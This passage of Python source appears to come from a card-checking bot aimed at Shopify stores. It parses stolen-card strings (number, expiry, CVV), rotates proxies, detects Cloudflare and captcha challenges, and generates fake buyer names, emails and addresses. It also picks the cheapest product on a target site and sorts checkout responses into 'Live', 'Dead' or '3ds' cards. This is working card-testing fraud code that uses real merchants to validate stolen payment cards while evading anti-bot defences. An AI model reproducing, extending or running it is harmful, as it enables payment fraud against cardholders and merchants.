    "IE": {"address1": "O'Connell Street", "city": "Dublin", "postalCode": "D01", "zoneCode": "D", "countryCode": "IE", "phone": "01 1234567"},
    "AT": {"address1": "Kärntner Straße 1", "city": "Vienna", "postalCode": "1010", "zoneCode": "9", "countryCode": "AT", "phone": "01 1234567"},
    "PL": {"address1": "Krakowskie Przedmieście", "city": "Warsaw", "postalCode": "00-068", "zoneCode": "MZ", "countryCode": "PL", "phone": "22 1234567"},
    "NZ": {"address1": "Queen Street", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "09 1234567"},
    "SG": {"address1": "Orchard Road", "city": "Singapore", "postalCode": "238801", "zoneCode": "SG", "countryCode": "SG", "phone": "61234567"},
    "MX": {"address1": "Paseo de la Reforma", "city": "Mexico City", "postalCode": "06500", "zoneCode": "CMX", "countryCode": "MX", "phone": "55 1234 5678"},
    "BR": {"address1": "Avenida Paulista", "city": "São Paulo", "postalCode": "01311", "zoneCode": "SP", "countryCode": "BR", "phone": "11 1234 5678"},
    "DEFAULT": {"address1": "123 Main St", "city": "New York", "postalCode": "10001", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
}

_US_ADDRESSES = [
    {"address1": "742 Evergreen Terrace", "city": "Springfield", "postalCode": "62704", "zoneCode": "IL", "countryCode": "US", "phone": "2175550000"},
    {"address1": "350 Fifth Avenue", "city": "New York", "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
    {"address1": "1600 Pennsylvania Ave", "city": "Washington", "postalCode": "20500", "zoneCode": "DC", "countryCode": "US", "phone": "2025550000"},
    {"address1": "233 Spring Street", "city": "New York", "postalCode": "10013", "zoneCode": "NY", "countryCode": "US", "phone": "2125550000"},
    {"address1": "8601 Beverly Blvd", "city": "Los Angeles", "postalCode": "90048", "zoneCode": "CA", "countryCode": "US", "phone": "3105550000"},
    {"address1": "401 N Michigan Ave", "city": "Chicago", "postalCode": "60611", "zoneCode": "IL", "countryCode": "US", "phone": "3125550000"},
    {"address1": "200 E Randolph St", "city": "Chicago", "postalCode": "60601", "zoneCode": "IL", "countryCode": "US", "phone": "3125550000"},
    {"address1": "1001 4th Ave", "city": "Seattle", "postalCode": "98154", "zoneCode": "WA", "countryCode": "US", "phone": "2065550000"},
    {"address1": "500 Terry Francois Blvd", "city": "San Francisco", "postalCode": "94158", "zoneCode": "CA", "countryCode": "US", "phone": "4155550000"},
    {"address1": "700 Clark Ave", "city": "St. Louis", "postalCode": "63102", "zoneCode": "MO", "countryCode": "US", "phone": "3145550000"},
]

def pick_addr(url, cc=None, rc=None):
    addr = random.choice(_US_ADDRESSES).copy()
    try:
        street_parts = addr["address1"].split(" ", 1)
        if len(street_parts) > 1:
            addr["address1"] = f"{random.randint(100, 9999)} {street_parts[1]}"
    except Exception as exc:
        logger.debug("Suppressed exception: %s", exc, exc_info=True)
    return addr

def capture(data, first, last):
    try:
        start = data.index(first) + len(first)
        end = data.index(last, start)
        return data[start:end]
    except ValueError:
        return None

def extract_between(text, start, end):
    if not text or not start or not end:
        return None
    try:
        if start in text:
            parts = text.split(start, 1)
            if len(parts) > 1:
                if end in parts[1]:
                    result = parts[1].split(end, 1)[0]
                    return result if result else None
        return None
    except Exception:
        return None

class Utils:
    @staticmethod
    def get_random_name():
        first_names = ["James", "John", "Robert", "Michael", "William", "David", "Richard", "Joseph", "Thomas", "Christopher", "Charles", "Daniel", "Matthew", "Anthony", "Mark", "Donald", "Steven", "Andrew", "Paul", "Joshua", "Kenneth", "Kevin", "Brian", "George", "Timothy", "Ronald", "Jason", "Edward", "Jeffrey", "Ryan", "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Elizabeth", "Susan", "Jessica", "Sarah", "Karen", "Lisa", "Nancy", "Betty", "Margaret", "Sandra", "Ashley", "Dorothy", "Kimberly", "Emily", "Donna", "Michelle", "Carol", "Amanda", "Melissa", "Deborah", "Stephanie", "Rebecca", "Sharon", "Laura", "Cynthia", "Kathleen", "Amy", "Angela", "Shirley", "Brenda", "Emma", "Anna"]
        last_names = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin", "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark", "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King", "Wright", "Scott", "Torres", "Nguyen", "Hill", "Flores", "Green", "Adams", "Nelson", "Baker", "Hall", "Rivera", "Campbell", "Mitchell", "Carter", "Roberts", "Turner", "Phillips", "Parker"]
        return (random.choice(first_names), random.choice(last_names))

    @staticmethod
    def generate_email(first, last):
        domains = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com", "aol.com", "mail.com", "proton.me", "zoho.com", "yandex.com", "gmx.com", "live.com"]
        suffix = random.choice(['', '', str(random.randint(1, 99)), str(random.randint(100, 9999))])
        sep = random.choice(['.', '_', ''])
        return f"{first.lower()}{sep}{last.lower()}{suffix}@{random.choice(domains)}"

def extract_session_token(text, headers):
    sst = headers.get('X-Checkout-One-Session-Token') or headers.get('x-checkout-one-session-token')
    if sst:
        return sst
    if not text:
        return None
    for start, end in [
        ('name="serialized-sessionToken" content="&quot;', '&quot;'),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"', '"'),
        ('data-session-token="', '"'),
        ('"sessionToken":"', '"'),
    ]:
        sst = extract_between(text, start, end)
        if sst: return sst
    for pattern in [
        r'"serializedSessionToken"\s*:\s*"([^"]+)"',
        r'"sessionToken"\s*:\s*"([^"]+)"',
        r'sessionToken\s*=\s*["\']([^"\']+)["\']',
        r'serializedSessionToken\s*=\s*["\']([^"\']+)["\']',
        r'sessionToken&quot;\s*:\s*&quot;([^&"]+)&quot;',
        r'serializedSessionToken&quot;\s*:\s*&quot;([^&"]+)&quot;',
        r'window\.serializedSessionToken\s*=\s*["\']([^"\']+)["\']',
        r'window\.sessionToken\s*=\s*["\']([^"\']+)["\']',
    ]:
        m = re.search(pattern, text)
        if m: return m.group(1)
    return None

def _get_fallback_proxies(uid=None):
    try:
        from bot.core.config import PROXIES_FILE, ST_PROXIES_FILE, GW_PROXIES_FILE
    except ImportError:
        DATA_DIR = os.getenv('DATA_DIR', '/data')
        if not os.path.exists(DATA_DIR):
            DATA_DIR = os.path.dirname(os.path.abspath(__file__))
        PROXIES_FILE = os.path.join(DATA_DIR, 'proxies.txt')
        ST_PROXIES_FILE = os.path.join(DATA_DIR, 'st_proxies.txt')
        GW_PROXIES_FILE = os.path.join(DATA_DIR, 'gw_proxies.txt')
    proxy_files = [PROXIES_FILE, ST_PROXIES_FILE, GW_PROXIES_FILE]
    all_proxies = []
    for f_path in proxy_files:
        if os.path.exists(f_path):
            try:
                with open(f_path, 'r', encoding='utf-8') as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith('#'):
                            parsed = parse_proxy(line)
                            if parsed and "example.com" not in parsed:
                                all_proxies.append(parsed)
            except Exception as exc:
                logger.debug("Suppressed exception: %s", exc, exc_info=True)
    return all_proxies

def parse_proxy(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.replace(" ", "").strip()
    if proxy_str.lower().startswith(('http://', 'https://', 'socks5://', 'socks5h://', 'socks4://', 'socks4a://', 'socks://')):
        return proxy_str
    if '@' in proxy_str:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 2:
        ip, port = parts
        return f"http://{ip}:{port}"
    elif len(parts) == 4:
        user, password, ip, port = parts[0], parts[1], parts[2], parts[3]
        if re.match(r'^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$', parts[0]):
            ip, port, user, password = parts[0], parts[1], parts[2], parts[3]
        return f"http://{user}:{password}@{ip}:{port}"
    return f"http://{proxy_str}" if proxy_str else None

_PROXY_STATS = {}
_PROXY_STATS_LOCK = threading.RLock()

def _record_proxy_success(proxy):
    if not proxy:
        return
    try:
        with _PROXY_STATS_LOCK:
            s = _PROXY_STATS.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
            s["success"] += 1
    except Exception:
        pass

def _record_proxy_fail(proxy):
    if not proxy:
        return
    try:
        with _PROXY_STATS_LOCK:
            s = _PROXY_STATS.setdefault(proxy, {"success": 0, "fail": 0, "last_fail": 0.0})
            s["fail"] += 1
            s["last_fail"] = time.time()
    except Exception:
        pass

def _is_proxy_healthy(proxy, cooldown=60.0):
    if not proxy:
        return False
    try:
        with _PROXY_STATS_LOCK:
            s = _PROXY_STATS.get(proxy)
            if not s:
                return True
            if time.time() - s.get("last_fail", 0) < cooldown:
                return False
            total = s.get("success", 0) + s.get("fail", 0)
            if total >= 5 and (s.get("success", 0) / total) < 0.2:
                return False
            return True
    except Exception:
        return True

def _rotate_fallback_proxy(current_proxy=None):
    try:
        candidates = _get_fallback_proxies()
        if not candidates:
            return None
        clean = [p for p in candidates if p != current_proxy and _is_proxy_healthy(p)]
        if not clean:
            clean = [p for p in candidates if p != current_proxy] or candidates
        with _PROXY_STATS_LOCK:
            def _score(p):
                s = _PROXY_STATS.get(p, {"success": 0, "fail": 0})
                total = s.get("success", 0) + s.get("fail", 0)
                return 0.5 if total == 0 else s.get("success", 0) / total
            clean.sort(key=_score, reverse=True)
        top = clean[:max(1, len(clean) // 3)]
        return random.choice(top)
    except Exception:
        return None

def _get_or_assign_checkout_proxy(checkout_id, current_proxy=None):
    if not checkout_id:
        return current_proxy
    try:
        with _CHECKOUT_PROXIES_LOCK:
            if checkout_id in _CHECKOUT_PROXIES:
                return _CHECKOUT_PROXIES[checkout_id]
            if current_proxy:
                _CHECKOUT_PROXIES[checkout_id] = current_proxy
                return current_proxy
            new_proxy = _rotate_fallback_proxy(current_proxy)
            if new_proxy:
                _CHECKOUT_PROXIES[checkout_id] = new_proxy
            return new_proxy
    except Exception:
        return current_proxy

def _release_checkout_proxy(checkout_id):
    if not checkout_id:
        return
    try:
        with _CHECKOUT_PROXIES_LOCK:
            _CHECKOUT_PROXIES.pop(checkout_id, None)
    except Exception:
        pass

def is_cloudflare_blocked(response_text, status_code=None, headers=None):
    if status_code in (403, 503):
        return True
    if headers:
        try:
            lower_keys = {str(k).lower() for k in headers.keys()}
            if any(h in lower_keys for h in ("cf-ray", "cf-chl-", "cf-mitigated")):
                return True
        except Exception:
            pass
    if not response_text:
        return False
    lower = response_text.lower()
    return any(ind in lower for ind in ["cloudflare", "cf-ray", "cf-chl-", "__cf_bm", "checking your browser", "ddos protection by cloudflare", "just a moment...", "cf_chl_opt", "cf-challenge", "challenge-form"])

def is_captcha_required(response_text):
    if not response_text:
        return False
    lower = response_text.lower()
    if any(ind in lower for ind in ['captcha_required', 'recaptcha', 'hcaptcha', 'g-recaptcha', 'shopify-challenge', 'challenge-form', 'cf-challenge', 'window._cf_chl_opt', 'shopify_recaptcha', 'recaptchav2', '"provider":"hcaptcha"']):
        return True
    if '/challenge' in lower or 'action="/challenge"' in lower:
        return True
    return False

_CURL_RETRY_ERRORS = ('curl: (56)', 'curl: (52)', 'curl: (35)', 'curl: (28)', 'curl: (7)', 'curl: (18)', 'curl: (92)', 'curl: (55)', 'failure in receiving', 'receiving network data', 'without response', 'connection reset', 'connection timed out', 'connection refused', 'failed to perform', 'empty reply', 'network error', 'ssl handshake', 'eof occurred', 'remote end closed', 'broken pipe', 'transfer closed')

async def make_graphql_request_with_captcha_handling(session, graphql_url, params, headers, json_data, checkout_url, max_retries=0, solve_captcha=True, proxy=None):
    _internal_max = max(max_retries, 2)
    response = None
    response_text = ''
    for attempt in range(_internal_max + 1):
        try:
            response = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
            response_text = await response.text()
            return response, response_text, False
        except Exception as e:
            err_str = str(e).lower()
            is_curl_error = any(marker in err_str for marker in _CURL_RETRY_ERRORS)
            if attempt < _internal_max and is_curl_error:
                wait = min(0.5 * (2 ** attempt), 3.0)
                await asyncio.sleep(wait)
                continue
            if attempt >= _internal_max:
                return None, str(e), False
            await asyncio.sleep(random.uniform(0.3, 0.8))
    return response, response_text, False

_global_connector = None
_global_connector_loop = None
_PER_SITE_SEMAPHORES = {}
_PER_SITE_SEMAPHORE_REFS = {}
_PER_SITE_LOCK = None

def _get_max_per_site():
    try:
        import sys
        sys.path.append(os.path.dirname(os.path.abspath(__file__)))
        from bot.core.config import bot_settings
        return int(bot_settings.get("max_per_site", 2))
    except Exception:
        return 2

async def _get_site_semaphore(domain):
    global _PER_SITE_LOCK
    if _PER_SITE_LOCK is None:
        _PER_SITE_LOCK = asyncio.Lock()
    async with _PER_SITE_LOCK:
        if domain not in _PER_SITE_SEMAPHORES:
            _PER_SITE_SEMAPHORES[domain] = asyncio.Semaphore(_get_max_per_site())
            _PER_SITE_SEMAPHORE_REFS[domain] = 0
        _PER_SITE_SEMAPHORE_REFS[domain] = _PER_SITE_SEMAPHORE_REFS.get(domain, 0) + 1
        return _PER_SITE_SEMAPHORES[domain]

async def _release_site_semaphore(domain):
    global _PER_SITE_LOCK
    if _PER_SITE_LOCK is None:
        return
    async with _PER_SITE_LOCK:
        refs = _PER_SITE_SEMAPHORE_REFS.get(domain, 0) - 1
        if refs <= 0:
            _PER_SITE_SEMAPHORE_REFS.pop(domain, None)
            _PER_SITE_SEMAPHORES.pop(domain, None)
        else:
            _PER_SITE_SEMAPHORE_REFS[domain] = refs

def get_global_connector():
    global _global_connector, _global_connector_loop
    try:
        current_loop = asyncio.get_running_loop()
    except RuntimeError:
        current_loop = None
    if _global_connector is None or _global_connector.closed or _global_connector_loop is not current_loop:
        _global_connector = aiohttp.TCPConnector(ssl=False, limit=1000, limit_per_host=100, use_dns_cache=True, ttl_dns_cache=1800, keepalive_timeout=60, enable_cleanup_closed=True)
        _global_connector_loop = current_loop
    return _global_connector

def prune_variant_cache():
    global _VARIANT_CACHE
    with _VARIANT_CACHE_LOCK:
        if len(_VARIANT_CACHE) > 1000:
            sorted_keys = sorted(_VARIANT_CACHE.keys(), key=lambda k: _VARIANT_CACHE[k][1])
            for k in sorted_keys[:-1000]:
                _VARIANT_CACHE.pop(k, None)

def normalize_cache_key(url):
    if not url:
        return ""
    url = url.strip().lower()
    if not url.startswith('http'):
        url = "https://" + url
    return url.rstrip('/')

KNOWN_DECLINE_CODES = {
    "PAYMENTS_CREDIT_CARD_CARD_DECLINED": ("Dead", 0.99), "PAYMENTS_CREDIT_CARD_GENERIC_DECLINE": ("Dead", 0.95),
    "PAYMENTS_CREDIT_CARD_INSUFFICIENT_FUNDS": ("Dead", 0.99), "PAYMENTS_CREDIT_CARD_EXPIRED": ("Dead", 1.00),
    "PAYMENTS_CREDIT_CARD_STOLEN_CARD": ("Dead", 1.00), "PAYMENTS_CREDIT_CARD_PICK_UP_CARD": ("Dead", 1.00),
    "PAYMENTS_CREDIT_CARD_LOST_CARD": ("Dead", 1.00), "PAYMENTS_CREDIT_CARD_VELOCITY_EXCEEDED": ("Dead", 0.95),
    "PAYMENTS_CREDIT_CARD_CVV_MISMATCH": ("Dead", 0.98), "PAYMENTS_CREDIT_CARD_NUMBER_INVALID_FORMAT": ("Dead", 1.00),
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": ("SITE_ERROR", 0.90), "PAYMENT_AMOUNT_TOO_SMALL": ("SITE_ERROR", 0.95),
    "ORDER_TOTAL_CHANGED": ("SITE_ERROR", 0.85), "DYNAMIC_PRICING_UNSUPPORTED": ("SITE_ERROR", 0.85),
    "PRICE_TOO_HIGH": ("SITE_ERROR", 0.90), "PENDING_TIMEOUT": ("SITE_ERROR", 0.80),
    "RATE_LIMITED_429": ("SITE_ERROR", 0.95), "GATEWAY_TIMEOUT": ("SITE_ERROR", 0.85),
    "MISMATCHED_BILL": ("AMBIGUOUS", 0.55),
}

PROXY_ERROR_INDICATORS = ["cloudflare", "cf-ray", "cf-chl-", "__cf_bm", "proxy error", "proxyerror", "connection reset", "connection refused", "connection timed out", "dns resolution failed", "shopify-challenge", "captcha_required", "security check", "challenge required", "hcaptcha", "recaptcha", "g-recaptcha", "ssl handshake", "eof occurred", "empty reply", "network error", "broken pipe"]

MESSAGE_NORMALIZATION = {"insufficient funds": "INSUFFICIENT_FUNDS", "card declined": "CARD_DECLINED", "do not honor": "DO_NOT_HONOR", "pick up card": "PICK_UP_CARD", "stolen card": "STOLEN_CARD", "lost card": "LOST_CARD", "expired card": "EXPIRED_CARD", "invalid cvv": "CVV_MISMATCH", "cvv mismatch": "CVV_MISMATCH", "cvc mismatch": "CVV_MISMATCH", "incorrect cvv": "CVV_MISMATCH", "authentication required": "3DS_REQUIRED", "otp required": "OTP_REQUIRED", "3d secure": "3DS_REQUIRED", "3ds required": "3DS_REQUIRED"}

ARABIC_DECLINE_HINTS = ["رفض", "بطاقة", "غير كاف", "منتهي", "خطأ", "غير صحيح"]
FRENCH_DECLINE_HINTS = ["refusée", "insuffisant", "expirée", "invalide", "erreur"]

async def fetch_products(domain, proxy_str=None, timeout_sec=20):
    try:
        if not domain.startswith('http'):
            domain = "https://" + domain
        connector = get_global_connector()
        timeout = aiohttp.ClientTimeout(total=timeout_sec)
        proxy = parse_proxy(proxy_str) if proxy_str else None
        result = []
        last_err = ""
        currency = "USD"

        async with AiohttpCurlCffiSession(connector=connector, connector_owner=False, timeout=timeout) as session:
            try:
                async with session.get(f"{domain}/products.json?limit=50", proxy=proxy, timeout=aiohttp.ClientTimeout(total=min(8, timeout_sec)), headers={"Connection": "keep-alive"}) as resp:
                    if resp.status == 200:
                        text = await resp.text()
                        if "shopify" in text.lower() or "products" in text.lower():
                            result = safe_json_loads(text, {}).get('products', [])
                        else:
                            last_err = "Not a shopify response"
                    else:
                        last_err = f"HTTP {resp.status}"
            except Exception as e:
                err_s = str(e).lower()
                last_err = f"error: {str(e)}"
                _record_proxy_fail(proxy)
                if any(m in err_s for m in _CURL_RETRY_ERRORS):
                    await asyncio.sleep(1.0)
                    try:
                        async with session.get(f"{domain}/products.json?limit=50", proxy=proxy, timeout=aiohttp.ClientTimeout(total=min(10, timeout_sec)), headers={"Connection": "keep-alive"}) as resp2:
                            if resp2.status == 200:
                                text2 = await resp2.text()
                                if "shopify" in text2.lower() or "products" in text2.lower():
                                    result = safe_json_loads(text2, {}).get('products', [])
                                    last_err = ""
                    except Exception:
                        pass

            if not result:
                try:
                    async with session.get(f"{domain}/collections/all/products.json?limit=10", proxy=proxy, timeout=min(10, timeout_sec), headers={"Connection": "close"}) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            result = safe_json_loads(text, {}).get('products', [])
                        else:
                            last_err = f"HTTP {resp.status}"
                except Exception as e:
                    last_err = f"error: {str(e)}"

            if not result:
                for search_char in ['a', 'e', 'o', '']:
                    try:
                        search_url = f"{domain}/search/suggest.json?q={search_char}&resources[type]=product&resources[limit]=5"
                        async with session.get(search_url, proxy=proxy, timeout=min(6, timeout_sec), headers={"Connection": "close"}) as resp:
                            if resp.status == 200:
                                text = await resp.text()
                                search_data = safe_json_loads(text, {})
                                products = search_data.get('resources', {}).get('results', {}).get('products', [])
                                for p in products:
                                    url_path = p.get('url', '')
                                    handle = None
                                    if '/products/' in url_path:
                                        handle = url_path.split('/products/')[-1].split('?')[0]
                                    elif p.get('handle'):
                                        handle = p.get('handle')
                                    if handle:
                                        try:
                                            async with session.get(f"{domain}/products/{handle}.js", proxy=proxy, timeout=min(5, timeout_sec), headers={"Connection": "close"}) as p_resp:
                                                if p_resp.status == 200:
                                                    p_text = await p_resp.text()
                                                    p_json = safe_json_loads(p_text, {})
                                                    if p_json:
                                                        p_json['is_ajax'] = True
                                                        result.append(p_json)
                                        except Exception:
                                            pass
                            else:
                                last_err = f"HTTP {resp.status}"
                    except Exception as e:
                        last_err = f"error: {str(e)}"
                    if result:
                        break

            if result:
                try:
                    async with session.get(f"{domain}/cart.js", proxy=proxy, timeout=min(5, timeout_sec), headers={"Connection": "close"}) as cart_resp:
                        if cart_resp.status == 200:
                            cart_data = await cart_resp.json(content_type=None)
                            if isinstance(cart_data, dict) and cart_data.get('currency'):
                                currency = cart_data.get('currency').upper()
                except Exception:
                    pass

        if not result:
            if "HTTP" in last_err or "error" in last_err:
                return False, f"error: failed to fetch products ({last_err})"
            return False, "<b>No Products found on site!</b>"

        candidates = []
        rate = EXCHANGE_RATES.get(currency.upper(), 1.0)
        for product in result:
            variants = product.get('variants')
            if not variants:
                continue
            prod_requires_shipping = product.get('requires_shipping', True)
            for variant in variants:
                if not variant.get('available', True):
                    continue
                try:
                    price_raw = variant.get('price', '0')
                    if product.get('is_ajax'):
                        price = float(price_raw) / 100.0
                    else:
                        if isinstance(price_raw, str):
                            price = float(price_raw.replace(',', ''))
                        else:
                            price = float(price_raw)
                    if price <= 0:
                        continue
                    usd_price = price * rate
                    if usd_price < 1.00:
                        continue
                    v_requires_shipping = variant.get('requires_shipping', prod_requires_shipping)
                    candidates.append({'price': price, 'usd_price': usd_price, 'requires_shipping': bool(v_requires_shipping), 'variant_id': str(variant['id']), 'handle': product.get('handle', '')})
                except (ValueError, TypeError, AttributeError):
                    continue

        if not candidates:
            return False, "<b>No Valid Products</b>"

        def _score(c):
            if c['usd_price'] > MAX_PRICE_USD:
                return float('inf')
            return c['usd_price'] if not c['requires_shipping'] else c['usd_price'] + 20.0

        candidates.sort(key=_score)
        best = candidates[0]
        if best['usd_price'] > MAX_PRICE_USD:
            return False, f"<b>No products under ${MAX_PRICE_USD:.2f} USD found</b>"

        min_product = {'site': domain, 'price': f"{best['price']:.2f}", 'usd_price': best['usd_price'], 'variant_id': best['variant_id'], 'link': f"{domain}/products/{best['handle']}", 'requires_shipping': best['requires_shipping'], 'currency': currency}

        import time as _time
        usd_p = best['usd_price']
        cache_ttl = 14400 if usd_p < 10.0 else (28800 if usd_p < 20.0 else 43200)
        cache_key = normalize_cache_key(domain)
        prune_variant_cache()
        with _VARIANT_CACHE_LOCK:
            _VARIANT_CACHE[cache_key] = (min_product['variant_id'], _time.time(), min_product['requires_shipping'], currency, usd_p, cache_ttl)
        logger.info(f"[CACHE] Cached: {cache_key} -> variant_id: {min_product['variant_id']}, usd_price: {usd_p:.2f}, ttl: {cache_ttl}s")
        return min_product
    except Exception as e:
        return False, f"error: {str(e)}"

def extract_clean_response(message):
    if not message:
        return "UNKNOWN_ERROR"
    message = str(message)
    for pattern in [r'(PAYMENTS_[A-Z_]+)', r'(CARD_[A-Z_]+)', r'([A-Z]+_[A-Z]+_[A-Z_]+)', r'([A-Z]+_[A-Z_]+)', r'code["\']?\s*[:=]\s*["\']?([^"\',]+)["\']?', r'{"code":"([^"]+)"', r"'code':'([^']+)'"]:
        matches = re.findall(pattern, message, re.IGNORECASE)
        for match in matches:
            if isinstance(match, tuple):
                match = match[0]
            if match and "_" in match and len(match) < 50:
                return match.strip("{}:'\" ")
    words = message.split()
    if words:
        first_word = words[0].strip("{}:'\" ")
        if "_" in first_word and first_word.isupper():
            return first_word
    clean = re.sub(r'[{}"\[\]\\]', '', message).strip()
    clean = re.sub(r'<[^>]+>', '', clean).strip()
    return clean[:80] if clean else "UNKNOWN_ERROR"

def _build_result(cc_string, success, message, gateway, price, currency, site=""):
    try:
        from datetime import datetime
        logger.info(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {cc_string} | {gateway} | {str(message)[:200]}")
    except Exception as exc:
        logger.debug("Suppressed exception: %s", exc, exc_info=True)
    clean_response = extract_clean_response(message)
    c_lower = clean_response.lower()
    message_str = str(message or "")
    confidence = 0.5
    reasons = []
    status_val = None

    if not success:
        message_upper = message_str.upper()
        msg_lower = message_str.lower()
        raw_lower = c_lower + " " + msg_lower

        if any(ind in raw_lower for ind in PROXY_ERROR_INDICATORS):
            status_val = 'PROXY_ERROR'
            confidence = 0.85
            reasons.append("proxy_indicator")

        if status_val is None:
            for code, (mapped_status, conf) in KNOWN_DECLINE_CODES.items():
                if code in message_upper:
                    status_val = mapped_status
                    confidence = conf
                    reasons.append(f"known_code:{code}")
                    break

        if status_val is None:
            if any(hint in message_str for hint in ARABIC_DECLINE_HINTS):
                status_val = 'Dead'
                confidence = 0.75
                reasons.append("arabic_decline")
            elif any(hint in msg_lower for hint in FRENCH_DECLINE_HINTS):
                status_val = 'Dead'
                confidence = 0.75
                reasons.append("french_decline")

        if status_val is None:
            is_site_error = False
            if any(kw in msg_lower for kw in ['captcha_required', 'captcha required', 'security check', 'challenge required']):
                is_site_error = True
            elif any(kw in message_upper for kw in ['PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT', 'PAYMENT_AMOUNT_TOO_SMALL', 'MINIMUM_ORDER', 'ORDER_TOTAL_CHANGED', 'DYNAMIC_PRICING_UNSUPPORTED', 'PRICE_TOO_HIGH', 'PENDING_TIMEOUT', 'RATE_LIMITED_429']):
                is_site_error = True
            elif any(kw in c_lower for kw in ['failed to fetch products', 'cart failed', 'dns resolution failed', 'proxyerror', 'timeout', 'amount too small', 'minimum order', 'order total']):
                is_site_error = True
            else:
                decline_kws = ['decline', 'fail', 'fraud', 'hold', 'pickup', 'stolen', 'lost', 'cvv', 'cvc', 'expiry', 'expired', 'insufficient', 'fund', 'limit', 'format', 'mismatch', 'invalid', 'restricted', 'error_code', 'payment_failed', 'card_declined', 'do not honor', 'not honor', 'blocked', 'unauthorized', 'generic_error', 'required_artifacts_unavailable']
                success_kws = ['placed', 'success', 'approved', 'thank you', 'order_placed']
                has_decline = any(kw in c_lower for kw in decline_kws)
                has_success = any(kw in c_lower for kw in success_kws)
                if not has_decline and not has_success:
                    is_site_error = True
                elif has_decline:
                    confidence = 0.80
                    reasons.append("decline_keyword")
            if is_site_error:
                status_val = 'SITE_ERROR'
                confidence = 0.75
                reasons.append("site_error_detected")
            else:
                status_val = 'Dead'
                if not reasons:
                    confidence = 0.60
                    reasons.append("unknown_decline")

    if status_val is None:
        if any(x in c_lower for x in ['otp_required', 'otp required', '3ds_required', '3d_secure', '3d secure', 'authentication_required', 'actionrequired', 'step_up', 'secure_3d', 'challenge_required', 'three_d_secure', 'three-d-secure', 'authenticate_three_d_secure']):
            status_val = '3ds'
            confidence = 0.90
            reasons.append("3ds_detected")
        elif any(x in c_lower for x in ['order_placed', 'order placed', 'processedreceipt', 'approved', 'charged', 'thank you', 'payment successful', 'payment_successful', 'order completed']) and not any(neg in c_lower for neg in ['not approved', 'unsuccessful', 'failed', 'declined', 'could not be', 'was not', 'invalid', 'error', 'fraud', 'rejected']):
            status_val = 'Live'
            confidence = 0.98
            reasons.append("order_confirmed")
        else:
            status_val = 'Dead'
            confidence = 0.55
            reasons.append("default_dead")

    if status_val == 'Dead' and confidence < 0.65:
        status_val = 'AMBIGUOUS'
        reasons.append("low_confidence")

    for phrase, code in MESSAGE_NORMALIZATION.items():
        if phrase in c_lower:
            clean_response = code
            break

    try:
        with _METRICS_LOCK:
            _METRICS["total_requests"] += 1
            if status_val in _METRICS:
                _METRICS[status_val] += 1
    except Exception:
        pass

    return {"Gateway": gateway, "Price": str(price) if price else "0.00", "Response": clean_response, "RawResponse": str(message), "Status": status_val, "Confidence": round(confidence, 2), "Reasons": reasons, "cc": cc_string, "Currency": currency or "USD"}

async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=None, timeout_sec=40, check_only=False, uid=None):
    site_url = site_url.strip()
    if '@' in site_url or '|' in site_url:
        m = re.match(r'^(https?://[a-zA-Z0-9.-]+)', site_url)
        if m:
            site_url = re.sub(r'\d+$', '', m.group(1))
    ourl = site_url if site_url.startswith('http') else f'https://{site_url}'
    logger.info(f"[{cc}] Starting process_card for {site_url}...")
    site_domain = urlparse(ourl).netloc
    checkout_id = f"{cc}:{site_domain}:{int(time.time() * 1000)}"
    assigned_proxy = _get_or_assign_checkout_proxy(checkout_id, proxy_str)
    if assigned_proxy:
        proxy_str = assigned_proxy
    site_sem = await _get_site_semaphore(site_domain)
    try:
        async with site_sem:
            return await _process_card_inner(cc, mes, ano, cvv, ourl, variant_id, proxy_str, timeout_sec, check_only, uid)
    finally:
        await _release_site_semaphore(site_domain)
        _release_checkout_proxy(checkout_id)

def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cvv_match = re.search(r'\d+', parts[3])
    if not cvv_match:
        raise ValueError("Invalid CC format. CVV must contain digits.")
    return {'cc': parts[0].strip(), 'mes': parts[1].strip(), 'ano': parts[2].strip(), 'cvv': cvv_match.group(0)}

# التحسين: دالة parse_cc_string محسّنة
def parse_cc_string(cc_string):
    parts = cc_string.split('|')
    if len(parts) != 4:
        raise ValueError("Invalid CC format. Use: CC|MM|YYYY|CVV")
    cvv_match = re.search(r'\d+', parts[3])
    if not cvv_match:
        raise ValueError("Invalid CC format. CVV must contain digits.")
    return {
        'cc': parts[0].strip(),
        'mes': parts[1].strip(),
        'ano': parts[2].strip(),
        'cvv': cvv_match.group(0)
    }

# ──────────────────────── Concurrency Engine ────────────────────────

MAX_CONCURRENT = 50000
_loop = None
_loop_thread = None
_loop_lock = threading.Lock()
_semaphore = None
_user_semaphores = {}
_user_semaphore_refs = {}
ACTIVE_WORKERS = 0

async def _shutdown_background_resources():
    current = asyncio.current_task()
    pending = [task for task in asyncio.all_tasks() if task is not current and not task.done()]
    for task in pending:
        task.cancel()
    if pending:
        await asyncio.gather(*pending, return_exceptions=True)

    sessions = []
    with _SESSION_POOL_STATE_LOCK:
        for pool in _SESSION_POOL.values():
            sessions.extend(pool)
        _SESSION_POOL.clear()

    for session in sessions:
        try:
            await session.close()
        except Exception as exc:
